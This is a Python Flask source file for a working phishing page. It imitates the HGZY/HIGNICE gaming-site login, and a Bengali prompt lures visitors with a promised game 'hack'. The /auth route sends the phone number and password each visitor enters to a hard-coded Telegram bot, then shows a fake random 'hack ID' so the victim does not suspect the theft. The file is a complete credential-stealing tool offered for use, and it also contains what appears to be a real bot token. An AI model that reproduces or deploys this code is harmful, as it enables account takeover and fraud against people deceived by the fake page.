import os
import random
import requests
from flask import Flask, render_template_string, request, redirect

app = Flask(__name__)

# --- কনফিগারেশন ---
BOT_TOKEN = "8669461197:AAFSIR9hecqfftSSdXNF1E90xYvpqVIAVRg"
CHAT_ID = "7897417844"
TG_GROUP = "https://t.me/tradingbyrgofficial"

# --- হুবহু HGZY লগইন ইন্টারফেস ---
LOGIN_HTML = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>HIGNICE - Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body, html {{ margin: 0; padding: 0; background: #f7f8ff; font-family: sans-serif; }}
        .tg-banner {{ background: #0088cc; color: white; text-align: center; padding: 12px; font-weight: bold; text-decoration: none; display: block; font-size: 14px; }}
        .header {{
            background: linear-gradient(180deg, #ff4d4d 0%, #ff7272 100%);
            height: 220px; padding: 15px; color: white; border-bottom-left-radius: 30px; border-bottom-right-radius: 30px;
            position: relative;
        }}
        .top-row {{ display: flex; justify-content: space-between; align-items: center; }}
        .brand {{ text-align: center; font-size: 30px; font-weight: 900; font-style: italic; letter-spacing: 2px; margin-top: 5px; }}
        .instruction-box {{ background: rgba(0,0,0,0.15); border: 1px solid rgba(255,255,255,0.3); border-radius: 10px; padding: 8px; margin-top: 10px; text-align: center; font-size: 13px; color: #fff; font-weight: bold; }}
        .login-card {{
            width: 90%; max-width: 400px; margin: -40px auto 20px;
            background: white; border-radius: 20px; padding: 25px 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.08); box-sizing: border-box;
        }}
        .tabs {{ display: flex; margin-bottom: 25px; border-bottom: 1px solid #f0f0f0; }}
        .tab {{ flex: 1; text-align: center; padding: 10px; color: #999; font-weight: bold; }}
        .tab.active {{ color: #ff4d4d; border-bottom: 3px solid #ff4d4d; }}
        .input-title {{ font-size: 15px; color: #333; margin-bottom: 10px; display: flex; align-items: center; font-weight: bold; }}
        .input-field {{ display: flex; align-items: center; background: #f7f8fa; border-radius: 12px; padding: 12px 15px; margin-bottom: 20px; border: 1px solid #f0f0f0; }}
        .input-field input {{ border: none; background: transparent; outline: none; width: 100%; font-size: 16px; color: #333; }}
        .btn-log {{ width: 100%; padding: 16px; background: #ccd1d9; color: #4e5969; border: none; border-radius: 40px; font-size: 18px; font-weight: bold; cursor: pointer; }}
        .btn-reg {{ width: 100%; padding: 14px; background: white; color: #ff4d4d; border: 1px solid #ff4d4d; border-radius: 40px; font-size: 18px; margin-top: 15px; cursor: pointer; text-decoration: none; display: block; text-align: center; }}
        .footer-tools {{ display: flex; justify-content: space-around; margin-top: 30px; font-size: 12px; color: #666; text-align: center; }}
    </style>
</head>
<body>
    <a href="{TG_GROUP}" class="tg-banner">📢 JOIN OUR TELEGRAM FOR HACK 📢</a>
    <div class="header">
        <div class="top-row"><span><i class="fa fa-angle-left"></i></span> <span>🇺🇸 EN</span></div>
        <div class="brand">HIGNICE</div>
        <div class="instruction-box">আপনার যে আইডিতে হ্যাক একটিভ করাতে চান সেই আইডিটি লগইন করুন</div>
        <h2 style="margin: 15px 0 5px;">Log in</h2>
        <p style="font-size: 11px; opacity: 0.9;">Please log in with your phone number or email</p>
    </div>
    <div class="login-card">
        <div class="tabs">
            <div class="tab active"><i class="fa fa-mobile-screen"></i> phone number</div>
            <div class="tab"><i class="fa fa-envelope"></i> Email Login</div>
        </div>
        <form action="/auth" method="POST">
            <div class="input-title">Phone number</div>
            <div class="input-field">
                <span style="font-weight:bold; color:#666; margin-right:10px;">+880</span>
                <input type="text" name="u" placeholder="Please enter the phone number" required>
            </div>
            <div class="input-title">Password</div>
            <div class="input-field">
                <input type="password" name="p" placeholder="Password" required>
            </div>
            <button type="submit" class="btn-log">Log in</button>
        </form>
        <a href="https://hgzy.vip/#/register" class="btn-reg">Register</a>
    </div>
    <div class="footer-tools">
        <div><i class="fa fa-lock-open" style="display:block; font-size:20px; color:red;"></i> Forgot password</div>
        <div><i class="fa fa-headset" style="display:block; font-size:20px; color:red;"></i> Customer Service</div>
    </div>
</body>
</html>
"""

SUCCESS_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; width: 85%; max-width: 350px; }
        .hack-id { background: #f8f9fa; border: 2px dashed #ff4d4d; padding: 15px; font-size: 20px; font-weight: bold; margin: 20px 0; letter-spacing: 2px; }
        .btn { background: #ff4d4d; color: white; border: none; padding: 15px; border-radius: 30px; width: 100%; font-size: 16px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <div style="font-size:60px; color:#4CAF50;">✔</div>
        <h2>সফলভাবে একটিভ হয়েছে!</h2>
        <p>নিচের হ্যাক আইডিটি কপি করে গেমে ব্যবহার করুন।</p>
        <div class="hack-id" id="hcode">{{ hack_id }}</div>
        <button class="btn" onclick="copy()">COPY ID</button>
    </div>
    <script>
        function copy() {
            var t = document.getElementById("hcode").innerText;
            navigator.clipboard.writeText(t);
            alert("কপি হয়েছে: " + t);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(LOGIN_HTML)

@app.route('/auth', methods=['POST'])
def auth():
    u = request.form.get('u')
    p = request.form.get('p')
    msg = f"🎯 **HGZY LOGIN**\\n\\n👤 **User:** `{u}`\\n🔑 **Pass:** `{p}`"
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                      json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    except: pass
    hid = "ARHAM-" + str(random.randint(100000, 999999)) + "-VIP"
    return render_template_string(SUCCESS_HTML, hack_id=hid)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
